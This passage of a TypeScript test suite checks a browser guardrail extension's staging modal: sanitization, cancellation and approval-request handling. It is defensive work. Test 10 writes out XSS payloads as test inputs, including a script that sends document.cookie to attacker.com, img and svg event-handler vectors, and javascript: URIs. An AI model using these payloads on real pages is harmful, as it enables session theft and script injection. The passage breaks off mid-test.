    category: 'CUSTOM_THIRD_PARTY_CATEGORY' as any,
    actionType: 'CUSTOM_EVENT_TYPE' as any,
  });
  updateStagingModal({ context: unknownCatContext });
  shadow = getStagingModalShadowRoot();

  let catVal = '';
  let mechVal = '';
  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
    if (label.textContent === 'Category') {
      catVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
    if (label.textContent === 'Mechanism') {
      mechVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
  });
  assertEquals(catVal, 'General Activity', 'Unknown category degrades gracefully to "General Activity"');
  assertEquals(mechVal, 'Standard Interaction', 'Unknown actionType degrades gracefully to "Standard Interaction"');

  // 9D: Missing origin and hostname
  const noHostContext = createSampleContext({
    origin: undefined,
    hostname: undefined,
  });
  updateStagingModal({ context: noHostContext });
  shadow = getStagingModalShadowRoot();
  let foundWebsiteLabel = false;
  shadow?.querySelectorAll('.gs-meta-label').forEach((label) => {
    if (label.textContent === 'Website') {
      foundWebsiteLabel = true;
    }
  });
  assertEquals(foundWebsiteLabel, false, 'Website item completely omitted when origin and hostname are unavailable');

  // 9E: Missing risk score (undefined)
  const noScoreContext = createSampleContext({
    riskLevel: RiskLevel.LOW,
    riskScore: undefined,
  });
  updateStagingModal({ context: noScoreContext });
  shadow = getStagingModalShadowRoot();
  assertEquals(
    shadow?.querySelector('.gs-risk-badge')?.textContent,
    'LOW',
    'Missing riskScore displays level without empty parentheses or NaN'
  );

  // 9F: Missing actionId
  const noIdContext = createSampleContext({
    actionId: '   ',
  });
  updateStagingModal({ context: noIdContext });
  shadow = getStagingModalShadowRoot();
  let auditVal = '';
  shadow?.querySelectorAll('.gs-meta-label').forEach((label, idx) => {
    if (label.textContent === 'Audit ID') {
      auditVal = shadow?.querySelectorAll('.gs-meta-value')[idx]?.textContent || '';
    }
  });
  assertEquals(auditVal, 'N/A', 'Empty actionId degrades gracefully to "N/A"');

  dismissStagingModal();
}

// =============================================================================
// TEST 10: POTENTIALLY HOSTILE DISPLAY STRINGS & SANITIZATION EDGE CASES
// =============================================================================
console.log('\n▶ Test 10: Potentially Hostile Display Strings & Sanitization Edge Cases');
{
  // 10A: XSS injection vectors in action description
  const hostileDesc = '<script>fetch("https://attacker.com/steal?c=" + document.cookie)</script><b onmouseover="alert(1)">Click Me</b>';
  const hostileContext = createSampleContext({
    description: hostileDesc,
  });
  showStagingModal({ context: hostileContext });
  let shadow = getStagingModalShadowRoot();
  const descEl = shadow?.querySelector('.gs-action-desc');
  assertEquals(descEl?.textContent, hostileDesc, 'Hostile script string assigned purely as textContent');
  assertEquals(descEl?.children.length, 0, 'No DOM elements or script nodes created from hostile description');

  // 10B: Malicious and dangerous URLs / hostnames
  assertEquals(getSafeDisplayHost('javascript:alert(1)', undefined), null, 'Rejects javascript: URI');
  assertEquals(getSafeDisplayHost('data:text/html,<script>alert(1)</script>', undefined), null, 'Rejects data: URI');
  assertEquals(getSafeDisplayHost('http://user:password@evil.com/path', undefined), null, 'Rejects URLs with credentials');
  assertEquals(getSafeDisplayHost(undefined, 'user:pass@evil.com'), null, 'Rejects hostnames with user:pass@ credentials');
  assertEquals(getSafeDisplayHost('about:blank', undefined), null, 'Rejects about:blank');
  assertEquals(getSafeDisplayHost(undefined, '<script>evil.com'), null, 'Rejects hostnames with HTML brackets');
  assertEquals(getSafeDisplayHost(undefined, 'evil.com/exploit'), null, 'Rejects hostnames containing slashes');

  // Verify clean, valid hostnames pass validation
  assertEquals(getSafeDisplayHost('https://secure.bank.com:8443/checkout', 'secure.bank.com'), 'secure.bank.com', 'Accepts valid secure hostname');
  assertEquals(getSafeDisplayHost('http://localhost:3000', 'localhost'), 'localhost', 'Accepts localhost');

  // When context contains a malicious origin, verify the Website item is omitted
  const maliciousHostContext = createSampleContext({
    origin: 'javascript:alert(document.cookie)',
    hostname: 'javascript:alert(1)',
  });
  updateStagingModal({ context: maliciousHostContext });
  shadow = getStagingModalShadowRoot();
  let foundMaliciousWebsite = false;
  shadow?.querySelectorAll('.gs-meta-label').forEach((label) => {
    if (label.textContent === 'Website') {
      foundMaliciousWebsite = true;
    }
  });
  assertEquals(foundMaliciousWebsite, false, 'Malicious origin/hostname rejected; Website field omitted');

  // 10C: XSS vectors in risk reasons
  const hostileReasonContext = createSampleContext({
    riskReasons: [
      '<img src=x onerror=alert("hacked")> Destructive deletion signal',
      '<svg/onload=alert("xss")> Financial interaction signal',
    ],
  });
  updateStagingModal({ context: hostileReasonContext });
  shadow = getStagingModalShadowRoot();
  const reasonDetails = shadow?.querySelectorAll('.gs-reason-detail') || [];
  assertEquals(reasonDetails.length, 2, 'Renders two hostile reason details');
  assertEquals(reasonDetails[0]?.children.length, 0, 'No image element created in reason detail');
  assertEquals(reasonDetails[1]?.children.length, 0, 'No svg element created in reason detail');

  // 10D: Direct validation of translateRiskReason
  const paymentTranslation = translateRiskReason('Action interacts with financial transactions, checkout flows, or billing elements.');
  assertEquals(paymentTranslation.headline, 'Payment or Billing Activity', 'Correct headline for payment reason');

  const destructiveTranslation = translateRiskReason('Action initiates permanent resource deletion, cancellation, or irreversible state destruction.');
  assertEquals(destructiveTranslation.headline, 'Permanent Removal or Deletion', 'Correct headline for destructive reason');

  const authTranslation = translateRiskReason('Action interacts with authentication boundaries, credential inputs, or login sessions.');
  assertEquals(authTranslation.headline, 'Sign-in or Account Credentials', 'Correct headline for auth reason');

  const downloadTranslation = translateRiskReason('Action triggers a file download, software installation, or document export.');
  assertEquals(downloadTranslation.headline, 'File Download', 'Correct headline for download reason');

  const extNavTranslation = translateRiskReason('Action navigates away from the current trusted domain to an external destination.');
  assertEquals(extNavTranslation.headline, 'External Website Destination', 'Correct headline for external nav reason');

  const fallbackTranslation = translateRiskReason('');
  assertEquals(fallbackTranslation.headline, 'Standard Safety Check', 'Empty reason translates to Standard Safety Check');

  // 10E: Direct validation of getRiskLevelPresentation
  const critPres = getRiskLevelPresentation(RiskLevel.CRITICAL);
  assertEquals(critPres.className, 'gs-risk-critical', 'Critical presentation has gs-risk-critical class');
  assert(Boolean(critPres.headline.includes('High-Impact Action')), 'Critical presentation headline describes high impact');

  const highPres = getRiskLevelPresentation(RiskLevel.HIGH);
  assertEquals(highPres.className, 'gs-risk-high', 'High presentation has gs-risk-high class');
  assert(Boolean(highPres.headline.includes('Sensitive Operation')), 'High presentation headline describes sensitive operation');

  const medPres = getRiskLevelPresentation(RiskLevel.MEDIUM);
  assertEquals(medPres.className, 'gs-risk-medium', 'Medium presentation has gs-risk-medium class');

  const lowPres = getRiskLevelPresentation(RiskLevel.LOW);
  assertEquals(lowPres.className, 'gs-risk-low', 'Low presentation has gs-risk-low class');

  // 10F: Direct validation of formatActionTypeName & formatCategoryName
  assertEquals(formatActionTypeName(ActionType.CLICK), 'Button / Link Click', 'Formats CLICK action type');
  assertEquals(formatActionTypeName(ActionType.SUBMIT), 'Form Submission', 'Formats SUBMIT action type');
  assertEquals(formatActionTypeName(undefined), 'Standard Interaction', 'Formats undefined action type');

  assertEquals(formatCategoryName(ActionCategory.PAYMENT), 'Payment & Billing', 'Formats PAYMENT category');
  assertEquals(formatCategoryName(ActionCategory.DESTRUCTIVE), 'Permanent Deletion / Removal', 'Formats DESTRUCTIVE category');
  assertEquals(formatCategoryName(ActionCategory.AUTHENTICATION), 'Authentication & Login', 'Formats AUTHENTICATION category');
  assertEquals(formatCategoryName(undefined), 'General Activity', 'Formats undefined category');

  dismissStagingModal();
}

// ============================================================
// TEST 11: Staging Mode Cancel Action & Interception Lifecycle
// ============================================================
console.log('\n▶ Test 11: Staging Mode Cancel Action & Interception Lifecycle');
{
  // Setup fresh isolated InterceptionController & ContinuationManager
  const testController = new InterceptionController();
  const testManager = new ContinuationManager(testController);

  let controlledHandlerExecutions = 0;
  const mockControlledHandler = () => {
    controlledHandlerExecutions++;
  };

  const actionId1 = 'action-cancel-test-11a';
  const testAction1: GuardrailAction = {
    id: actionId1,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com/checkout', title: 'Test Checkout' },
    element: { tagName: 'BUTTON', id: 'pay-btn', visibleText: 'Pay $99.00' },
  };

  testController.register(testAction1, 'Test action registered');
  const heldRecord1 = testController.holdAction(actionId1, 'Action paused for review');
  testManager.registerHeldAction(testAction1, heldRecord1, mockControlledHandler);

  const context1 = createSampleContext({
    actionId: actionId1,
    description: 'Payment: Click on "Pay $99.00"',
    category: ActionCategory.PAYMENT,
    riskLevel: RiskLevel.HIGH,
    riskScore: 75,
    riskReasons: ['Payment action with elevated sensitivity'],
    responseAction: ResponseAction.PROTECT,
    interceptionState: InterceptionState.HELD,
  });

  // 11A: Successful cancellation of a HELD interception
  console.log('  → Subtest 11A: Successful Cancellation of HELD Action via Cancel Button');
  let cancelSuccessResult: any = null;
  showStagingModal({
    context: context1,
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancelSuccess: (res) => {
      cancelSuccessResult = res;
    },
  });

  const shadow1 = getStagingModalShadowRoot()!;
  assert(Boolean(shadow1), 'Shadow root is mounted');

  const cancelBtn1 = shadow1.querySelector('#gs-btn-cancel-action') as any;
  assert(Boolean(cancelBtn1), 'Cancel Action button (#gs-btn-cancel-action) exists in footer');
  assertEquals(cancelBtn1?.textContent, 'Cancel Action', 'Cancel button displays "Cancel Action"');

  // Trigger Cancel Click
  cancelBtn1?.click();

  // Validate State in InterceptionController
  const recordAfterCancel = testController.getRecord(actionId1);
  assertEquals(recordAfterCancel?.state, InterceptionState.CANCELLED, 'InterceptionController record transitioned to CANCELLED state');
  assert(Boolean(recordAfterCancel?.resolvedAt), 'Interception record has resolution timestamp (resolvedAt)');
  assertEquals(cancelSuccessResult?.success, true, 'onCancelSuccess callback received success: true');
  assertEquals(cancelSuccessResult?.actionId, actionId1, 'onCancelSuccess callback received correct actionId');

  // Validate Zero Test Handler Execution
  assertEquals(controlledHandlerExecutions, 0, 'Controlled test action handler was NOT executed (execution count is 0)');
  assertEquals(testManager.getExecutionCount(actionId1), 0, 'ContinuationManager reports 0 executions');
  assertEquals(testManager.getCurrentHeldAction(), null, 'Temporary held action state in ContinuationManager is cleared');

  // Validate UI Feedback: Confirmation Banner
  const confirmationBanner = shadow1.querySelector('.gs-confirmation-banner');
  assert(Boolean(confirmationBanner), 'Confirmation banner is rendered in modal');
  assert(confirmationBanner?.classList.contains('gs-confirmation-success') || false, 'Banner has .gs-confirmation-success class');
  const bannerTitle = shadow1.querySelector('.gs-confirmation-title');
  assertEquals(bannerTitle?.textContent, 'Action cancelled. Nothing was changed.', 'Banner displays exact confirmation: "Action cancelled. Nothing was changed."');

  // Validate UI Feedback: Header badge and controls update
  const modePill = shadow1.querySelector('.gs-mode-pill');
  assertEquals(modePill?.textContent, 'Cancelled', 'Header mode pill updated to "Cancelled"');
  assert(modePill?.classList.contains('gs-badge-cancelled') || false, 'Header mode pill has .gs-badge-cancelled class');
  assertEquals(cancelBtn1?.disabled, true, 'Cancel button is disabled after cancellation');
  assertEquals(cancelBtn1?.textContent, 'Action Cancelled', 'Cancel button text updated to "Action Cancelled"');

  dismissStagingModal();

  // 11B: Attempted cancellation of an already-CONTINUED action
  console.log('  → Subtest 11B: Attempted Cancellation of an Already-CONTINUED Action');
  const actionId2 = 'action-cancel-test-11b';
  const testAction2: GuardrailAction = {
    id: actionId2,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction2, 'Test action registered');
  testController.holdAction(actionId2, 'Paused');
  testController.continueAction(actionId2, 'Approved');

  const continuedRecord = testController.getRecord(actionId2)!;
  assertEquals(continuedRecord.state, InterceptionState.CONTINUED, 'Action 2 is in CONTINUED state');

  const context2 = createSampleContext({
    actionId: actionId2,
    category: ActionCategory.GENERAL,
    riskLevel: RiskLevel.LOW,
    riskScore: 20,
    riskReasons: ['Routine'],
    responseAction: ResponseAction.PROTECT,
    interceptionState: InterceptionState.CONTINUED,
  });

  let cancelErrorResult: any = null;
  showStagingModal({
    context: context2,
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancelError: (res) => {
      cancelErrorResult = res;
    },
  });

  const shadow2 = getStagingModalShadowRoot()!;
  const cancelBtn2 = shadow2.querySelector('#gs-btn-cancel-action') as any;
  cancelBtn2.click();

  assertEquals(cancelErrorResult?.success, false, 'Cancellation rejected because action is already CONTINUED');
  const errorBanner = shadow2.querySelector('.gs-confirmation-banner');
  assert(Boolean(errorBanner), 'Error banner is rendered');
  assert(errorBanner?.classList.contains('gs-confirmation-error') || false, 'Banner has .gs-confirmation-error class');
  const errorTitle = shadow2.querySelector('.gs-confirmation-title');
  assertEquals(errorTitle?.textContent, 'Cancellation Could Not Be Completed', 'Error banner displays "Cancellation Could Not Be Completed"');

  const successBannersIn2 = shadow2.querySelectorAll('.gs-confirmation-success');
  assertEquals(successBannersIn2.length, 0, 'Success confirmation banner is NOT displayed');
  assertEquals(testController.getRecord(actionId2)?.state, InterceptionState.CONTINUED, 'Record state remains CONTINUED');

  dismissStagingModal();

  // 11C: Attempted cancellation of an already-CANCELLED action
  console.log('  → Subtest 11C: Attempted Cancellation of an Already-CANCELLED Action');
  let cancelAlreadyCancelledResult: any = null;
  showStagingModal({
    context: { ...context1, actionId: actionId1 },
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancelError: (res) => {
      cancelAlreadyCancelledResult = res;
    },
  });

  const shadow3 = getStagingModalShadowRoot()!;
  const cancelBtn3 = shadow3.querySelector('#gs-btn-cancel-action') as any;
  cancelBtn3.click();

  assertEquals(cancelAlreadyCancelledResult?.success, false, 'Cancellation rejected because action is already CANCELLED');
  const shadow3ErrorBanner = shadow3.querySelector('.gs-confirmation-error');
  assert(Boolean(shadow3ErrorBanner), 'Error banner displayed for already-cancelled action');
  const successBannersIn3 = shadow3.querySelectorAll('.gs-confirmation-success');
  assertEquals(successBannersIn3.length, 0, 'Success confirmation banner is NOT displayed');

  dismissStagingModal();

  // 11D: Attempted cancellation with invalid or missing actionId
  console.log('  → Subtest 11D: Attempted Cancellation with Missing Action Identifier');
  let missingIdErrorResult: any = null;
  showStagingModal({
    context: { ...context1, actionId: '' },
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancelError: (res) => {
      missingIdErrorResult = res;
    },
  });

  const shadow4 = getStagingModalShadowRoot()!;
  const cancelBtn4 = shadow4.querySelector('#gs-btn-cancel-action') as any;
  cancelBtn4.click();

  assertEquals(missingIdErrorResult?.success, false, 'Cancellation rejected due to missing actionId');
  const shadow4ErrorBanner = shadow4.querySelector('.gs-confirmation-error');
  assert(Boolean(shadow4ErrorBanner), 'Error banner displayed for missing actionId');

  dismissStagingModal();

  // 11E: Prevention of repeated clicks, duplicate cancellation requests, and duplicate event handlers
  console.log('  → Subtest 11E: Repeated Clicks & Duplicate Cancellation Prevention');
  const actionId5 = 'action-cancel-test-11e';
  const testAction5: GuardrailAction = {
    id: actionId5,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };

  testController.register(testAction5, 'Action 5 registered');
  const heldRecord5 = testController.holdAction(actionId5, 'Action 5 held');

  let test5HandlerExecutions = 0;
  testManager.registerHeldAction(testAction5, heldRecord5, () => {
    test5HandlerExecutions++;
  });

  let cancelCallCount = 0;
  showStagingModal({
    context: createSampleContext({
      actionId: actionId5,
      category: ActionCategory.GENERAL,
      riskLevel: RiskLevel.MEDIUM,
      riskScore: 50,
      riskReasons: ['Test reason'],
      responseAction: ResponseAction.PROTECT,
      interceptionState: InterceptionState.HELD,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onCancel: (id) => {
      cancelCallCount++;
      return testManager.cancelAction(id, 'Cancelled in test');
    },
  });

  const shadow5 = getStagingModalShadowRoot()!;
  const cancelBtn5 = shadow5.querySelector('#gs-btn-cancel-action') as any;

  // Simulate 5 rapid clicks on the cancel button
  cancelBtn5.click();
  cancelBtn5.click();
  cancelBtn5.click();
  cancelBtn5.click();
  cancelBtn5.click();

  assertEquals(cancelCallCount, 1, 'Cancellation logic executed exactly once despite 5 rapid clicks');
  assertEquals(cancelBtn5.disabled, true, 'Cancel button is disabled after first click');
  assertEquals(test5HandlerExecutions, 0, 'Test handler was never executed');
  assertEquals(testController.getRecord(actionId5)?.state, InterceptionState.CANCELLED, 'Action 5 is CANCELLED');

  dismissStagingModal();

  // 11F: Guarantee that a cancelled action CANNOT transition into CONTINUED state
  console.log('  → Subtest 11F: Terminal State Guarantee - Cancelled Action Cannot Transition to CONTINUED');
  const continueAttemptResult = testManager.continueAction(actionId1, 'Attempt to continue cancelled action');
  assertEquals(continueAttemptResult.success, false, 'ContinuationManager rejected continuing a CANCELLED action');
  assert(Boolean(continueAttemptResult.error?.includes('CANCELLED')), 'Error explicitly notes current state is CANCELLED');

  let directControllerErrorThrown = false;
  try {
    testController.continueAction(actionId1, 'Direct controller transition attempt');
  } catch (err: any) {
    if (err instanceof InvalidStateTransitionError) {
      directControllerErrorThrown = true;
    }
  }
  assert(directControllerErrorThrown, 'InterceptionController throws InvalidStateTransitionError when attempting CANCELLED -> CONTINUED');
  assertEquals(testController.getRecord(actionId1)?.state, InterceptionState.CANCELLED, 'Interception state remains CANCELLED');
  assertEquals(controlledHandlerExecutions, 0, 'Handler execution count remains 0');

  dismissStagingModal();
}

// ============================================================
// TEST 12: Staging Mode Local Approval-Request Intent
// ============================================================
console.log('\n▶ Test 12: Staging Mode Local Approval-Request Intent');
{
  const testController = new InterceptionController();
  const testManager = new ContinuationManager(testController);

  let testActionHandlerExecutions = 0;
  const mockActionHandler = () => {
    testActionHandlerExecutions++;
  };

  const actionId12 = 'action-approval-test-12a';
  const testAction12: GuardrailAction = {
    id: actionId12,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com/transfer?user=alice&token=secret123#frag', title: 'Funds Transfer' },
    element: { tagName: 'BUTTON', id: 'transfer-btn', visibleText: 'Transfer $5,000' },
  };

  testController.register(testAction12, 'Test action 12 registered');
  const heldRecord12 = testController.holdAction(actionId12, 'Action paused for protective review');
  testManager.registerHeldAction(testAction12, heldRecord12, mockActionHandler);

  const context12 = createSampleContext({
    actionId: actionId12,
    description: 'Payment trigger: Click on "Transfer $5,000"',
    category: ActionCategory.PAYMENT,
    riskLevel: RiskLevel.HIGH,
    riskScore: 70,
    riskReasons: ['High-value financial transfer triggered'],
    responseAction: ResponseAction.PROTECT,
    interceptionState: InterceptionState.HELD,
    origin: 'https://test.example.com',
    hostname: 'test.example.com',
  });

  // 12A: Valid HELD action produces typed ApprovalRequestIntent & DOM event
  console.log('  → Subtest 12A: Valid HELD Action Produces Typed ApprovalRequestIntent & DOM Event');
  // Direct test of createApprovalRequestIntent function
  const directIntent: ApprovalRequestIntent = createApprovalRequestIntent(context12, heldRecord12);
  assertEquals(directIntent.type, 'GUARDRAIL_APPROVAL_REQUEST_INTENT', 'createApprovalRequestIntent produces typed ApprovalRequestIntent');
  assertEquals(directIntent.status, 'LOCAL_PROTOTYPE_ONLY', 'Direct intent has LOCAL_PROTOTYPE_ONLY status');

  let directIntentThrowsOnNonHeld = false;
  try {
    createApprovalRequestIntent({ ...context12, interceptionState: InterceptionState.CANCELLED });
  } catch {
    directIntentThrowsOnNonHeld = true;
  }
  assert(directIntentThrowsOnNonHeld, 'createApprovalRequestIntent throws Error if action is not in HELD state');

  // Direct test of handleModalRequestApproval function
  const mockTestBtn = new MockDOMElement('BUTTON') as any;
  const mockTestBody = new MockDOMElement('DIV') as any;
  const mockTestHeader = new MockDOMElement('DIV') as any;
  const directModalResult: ApprovalRequestResult = handleModalRequestApproval(undefined, {}, {
    requestBtn: mockTestBtn,
    body: mockTestBody,
    header: mockTestHeader,
  });
  assertEquals(directModalResult.success, false, 'handleModalRequestApproval directly rejects undefined context');
  assertEquals(mockTestBtn.disabled, true, 'handleModalRequestApproval disables requestBtn immediately');

  let approvalSuccessResult: any = null;
  let eventDispatched = false;
  let dispatchedEventDetail: any = null;

  const approvalEventListener = (e: any) => {
    eventDispatched = true;
    dispatchedEventDetail = e.detail;
  };
  (globalThis as any).document.addEventListener('guardrail:approval-requested', approvalEventListener);

  showStagingModal({
    context: context12,
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onRequestApprovalSuccess: (res) => {
      approvalSuccessResult = res;
    },
  });

  const shadow12 = getStagingModalShadowRoot();
  assert(Boolean(shadow12), 'Staging Modal shadow root is mounted');

  const requestApprovalBtn = shadow12?.querySelector('#gs-btn-request-approval') as any;
  assert(Boolean(requestApprovalBtn), 'Request Approval button (#gs-btn-request-approval) exists in footer');
  assertEquals(requestApprovalBtn?.textContent, 'Request Approval', 'Button displays "Request Approval"');

  // Click "Request Approval"
  requestApprovalBtn.click();

  assertEquals(approvalSuccessResult?.success, true, 'onRequestApprovalSuccess callback reported success: true');
  assertEquals(approvalSuccessResult?.actionId, actionId12, 'Approval result carries correct actionId');
  assertEquals(approvalSuccessResult?.isBackendConnected, false, 'Approval result explicitly flags isBackendConnected: false');

  assert(eventDispatched, 'DOM event "guardrail:approval-requested" was dispatched');
  assertEquals(dispatchedEventDetail?.actionId, actionId12, 'Dispatched event carries matching actionId');
  assertEquals(dispatchedEventDetail?.isBackendConnected, false, 'Dispatched event flags isBackendConnected: false');

  const intent = approvalSuccessResult?.intent!;
  assert(Boolean(intent), 'ApprovalRequestIntent object is populated');
  assertEquals(intent?.type, 'GUARDRAIL_APPROVAL_REQUEST_INTENT', 'Intent type is GUARDRAIL_APPROVAL_REQUEST_INTENT');
  assertEquals(intent?.status, 'LOCAL_PROTOTYPE_ONLY', 'Intent status is strictly LOCAL_PROTOTYPE_ONLY');
  assertEquals(intent?.interceptionState, InterceptionState.HELD, 'Intent records interceptionState as HELD');
  assertEquals(intent?.actionId, actionId12, 'Intent matches actionId');
  assertEquals(intent?.category, ActionCategory.PAYMENT, 'Intent preserves ActionCategory.PAYMENT');
  assertEquals(intent?.riskLevel, RiskLevel.HIGH, 'Intent preserves RiskLevel.HIGH');
  assertEquals(intent?.riskScore, 70, 'Intent preserves riskScore 70');
  assertEquals(intent?.hostname, 'test.example.com', 'Intent carries sanitized hostname');
  assertEquals(intent?.origin, 'https://test.example.com', 'Intent carries sanitized origin');
  assert(Boolean(intent?.requestedAt), 'Intent carries requestedAt timestamp');

  (globalThis as any).document.removeEventListener('guardrail:approval-requested', approvalEventListener);

  // 12B: Sensitive values, passwords, tokens, OTPs, and forms strictly excluded
  console.log('  → Subtest 12B: Sensitive Values & Form Contents are Strictly Excluded');
  const intentKeys = Object.keys(intent);
  const forbiddenSensitiveKeys = [
    'password', 'pass', 'pwd',
    'otp', 'pin', 'secret',
    'card', 'cvv', 'cvc',
    'token', 'cookie', 'auth',
    'value', 'inputvalue', 'formcontent', 'body',
    'element', 'target', 'node', 'elementnode'
  ];
  for (const forbidden of forbiddenSensitiveKeys) {
    const found = intentKeys.some((k) => k.toLowerCase() === forbidden);
    assert(!found, `Intent excludes forbidden sensitive property "${forbidden}"`);
  }

  // Ensure origin/hostname do not leak URL query params or auth credentials
  assert(!intent.origin?.includes('token='), 'Intent origin does not leak URL token parameter');
  assert(!intent.origin?.includes('secret123'), 'Intent origin does not leak query secrets');
  assert(!intent.hostname?.includes('token='), 'Intent hostname does not leak query secrets');
  assert(!intent.description.includes('secret123'), 'Action description does not contain query secrets');

  // 12C: Protected action remains HELD with zero handler execution & cancel remains available
  console.log('  → Subtest 12C: Protected Action Remains HELD with Zero Handler Execution');
  assertEquals(testController.getRecord(actionId12)?.state, InterceptionState.HELD, 'InterceptionRecord remains in HELD state');
  assertEquals(testManager.getExecutionCount(actionId12), 0, 'ContinuationManager reports 0 handler executions');
  assertEquals(testActionHandlerExecutions, 0, 'Controlled test action handler execution count is strictly 0');

  // Verify that the user can still cancel this held action
  const cancelBtn12 = shadow12?.querySelector('#gs-btn-cancel-action') as any;
  assert(Boolean(cancelBtn12), 'Cancel button remains present in DOM');
  assertEquals(cancelBtn12.disabled, false, 'Cancel button is not disabled after requesting approval');

  cancelBtn12.click();
  assertEquals(testController.getRecord(actionId12)?.state, InterceptionState.CANCELLED, 'Action transitioned to CANCELLED upon user cancel');
  assertEquals(testActionHandlerExecutions, 0, 'Handler still NOT executed after cancellation (count: 0)');

  dismissStagingModal();

  // 12D: Attempted request on already CONTINUED or CANCELLED action rejected
  console.log('  → Subtest 12D: Attempted Request on Already CONTINUED or CANCELLED Action Rejected');
  // 1) Test on already CANCELLED action (actionId12 was just cancelled)
  let cancelledRequestError: any = null;
  showStagingModal({
    context: { ...context12, interceptionState: InterceptionState.CANCELLED },
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onRequestApprovalError: (res) => {
      cancelledRequestError = res;
    },
  });

  const shadow12D = getStagingModalShadowRoot();
  const reqBtn12D = shadow12D?.querySelector('#gs-btn-request-approval') as any;
  reqBtn12D.click();

  assertEquals(cancelledRequestError?.success, false, 'Approval request rejected on CANCELLED action');
  assert(Boolean(cancelledRequestError?.error?.includes('CANCELLED')), 'Error message explains action is in CANCELLED state');
  const errorBanner12D = shadow12D?.querySelector('.gs-confirmation-error');
  assert(Boolean(errorBanner12D), 'Error banner rendered for CANCELLED action request attempt');
  assertEquals(shadow12D?.querySelector('.gs-confirmation-title')?.textContent, 'Approval Request Could Not Be Prepared', 'Error banner headline displayed');
  assertEquals(reqBtn12D.textContent, 'Request Unavailable', 'Button text updated to "Request Unavailable"');

  dismissStagingModal();

  // 2) Test on already CONTINUED action
  const actionIdContinued = 'action-approval-continued-12d';
  const testActionCont: GuardrailAction = {
    id: actionIdContinued,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testActionCont, 'Registered');
  testController.holdAction(actionIdContinued, 'Held');
  testController.continueAction(actionIdContinued, 'Continued');

  let continuedRequestError: any = null;
  showStagingModal({
    context: createSampleContext({
      actionId: actionIdContinued,
      interceptionState: InterceptionState.CONTINUED,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onRequestApprovalError: (res) => {
      continuedRequestError = res;
    },
  });

  const shadowCont = getStagingModalShadowRoot();
  const reqBtnCont = shadowCont?.querySelector('#gs-btn-request-approval') as any;
  reqBtnCont.click();

  assertEquals(continuedRequestError?.success, false, 'Approval request rejected on CONTINUED action');
  assert(Boolean(continuedRequestError?.error?.includes('CONTINUED')), 'Error message explains action is in CONTINUED state');
  const errorBannerCont = shadowCont?.querySelector('.gs-confirmation-error');
  assert(Boolean(errorBannerCont), 'Error banner rendered for CONTINUED action request attempt');

  dismissStagingModal();

  // 3) Test with missing action context
  let missingCtxError: any = null;
  showStagingModal({
    context: createSampleContext({ actionId: '' }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onRequestApprovalError: (res) => {
      missingCtxError = res;
    },
  });

  const shadowMissing = getStagingModalShadowRoot();
  const reqBtnMissing = shadowMissing?.querySelector('#gs-btn-request-approval') as any;
  reqBtnMissing.click();

  assertEquals(missingCtxError?.success, false, 'Approval request rejected for missing actionId');

  dismissStagingModal();

  // 12E: Duplicate clicks & rapid repeated requests prevented
  console.log('  → Subtest 12E: Repeated Clicks & Duplicate Request Prevention');
  const actionId12E = 'action-approval-test-12e';
  const testAction12E: GuardrailAction = {
    id: actionId12E,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction12E, 'Registered');
  testController.holdAction(actionId12E, 'Held');

  let test12EHandlerExecutions = 0;
  testManager.registerHeldAction(testAction12E, testController.getRecord(actionId12E)!, () => {
    test12EHandlerExecutions++;
  });

  let requestCallCount = 0;
  let test12EEventsDispatched = 0;
  const countListener = () => {
    test12EEventsDispatched++;
  };
  (globalThis as any).document.addEventListener('guardrail:approval-requested', countListener);

  showStagingModal({
    context: createSampleContext({
      actionId: actionId12E,
      category: ActionCategory.GENERAL,
      riskLevel: RiskLevel.MEDIUM,
      riskScore: 40,
      interceptionState: InterceptionState.HELD,
    }),
    state: 'active',
    controller: testController,
    continuationManager: testManager,
    onRequestApprovalSuccess: () => {
      requestCallCount++;
    },
  });

  const shadow12E = getStagingModalShadowRoot();
  const reqBtn12E = shadow12E?.querySelector('#gs-btn-request-approval') as any;

  // Simulate 5 rapid clicks on the Request Approval button
  reqBtn12E.click();
  reqBtn12E.click();
  reqBtn12E.click();
  reqBtn12E.click();
  reqBtn12E.click();

  assertEquals(requestCallCount, 1, 'Approval request logic executed exactly once despite 5 rapid clicks');
  assertEquals(test12EEventsDispatched, 1, 'Exactly one DOM event dispatched despite 5 rapid clicks');
  assertEquals(reqBtn12E.disabled, true, 'Request button is disabled after first click');
  assertEquals(reqBtn12E.textContent, 'Request Prepared (Local)', 'Button text updated to "Request Prepared (Local)"');
  assertEquals(test12EHandlerExecutions, 0, 'Handler was never executed during repeated clicks');
  assertEquals(testController.getRecord(actionId12E)?.state, InterceptionState.HELD, 'Action remains HELD');

  (globalThis as any).document.removeEventListener('guardrail:approval-requested', countListener);
  dismissStagingModal();

  // 12F: UI copy strictly communicates local prototype boundary
  console.log('  → Subtest 12F: UI Copy Strictly Enforces Prototype Boundary');
  const actionId12F = 'action-approval-test-12f';
  const testAction12F: GuardrailAction = {
    id: actionId12F,
    type: ActionType.CLICK,
    timestamp: '2026-10-13T12:00:00Z',
    page: { url: 'https://test.example.com', title: 'Test' },
  };
  testController.register(testAction12F, 'Registered');
  testController.holdAction(actionId12F, 'Held');

